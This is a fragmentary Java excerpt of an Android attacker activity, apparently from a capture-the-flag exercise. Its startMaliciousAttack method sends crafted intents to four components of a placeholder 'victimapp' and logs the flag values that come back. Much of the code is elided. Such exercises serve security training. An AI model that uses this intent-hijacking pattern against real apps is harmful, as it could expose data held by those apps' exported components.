...
public class MainActivity extends AppCompatActivity {
    ...
    ActivityResultLauncher<Intent> mStartForResult = registerForActivityResult(
            ...
            new ActivityResultCallback<ActivityResult>() {
                ...
                public void onActivityResult(ActivityResult result) {
                    ...
                    if (result.getResultCode() == 1 || result.getResultCode() == 2) { // for part 1, 2
                        ...
                        try {
                            ...
                            Log.d(TAG, "Part 4:" + " - value: " + flagFour[1]);
    ...
    protected void startMaliciousAttack() {
        ...
        for (String s : ActivityParts) { //launch activity for all of 4 parts
            maliciousIntent.setComponent(new ComponentName("com.example.victimapp", s));

            //Attempt to attack the parth n
            try {
